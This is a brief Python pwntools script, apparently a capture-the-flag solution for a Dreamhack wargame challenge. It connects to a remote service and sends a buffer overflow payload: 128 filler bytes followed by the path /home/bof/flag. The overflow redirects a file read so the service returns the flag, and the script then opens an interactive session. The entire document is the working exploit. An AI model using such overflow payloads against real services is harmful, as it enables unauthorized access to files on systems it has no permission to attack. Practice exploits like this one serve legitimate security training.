from pwn import *

r = remote("host3.dreamhack.games", 8527)

payload = b"A"*128+b"/home/bof/flag\x00"
r.sendlineafter(b"meow? ", payload)
r.interactive()
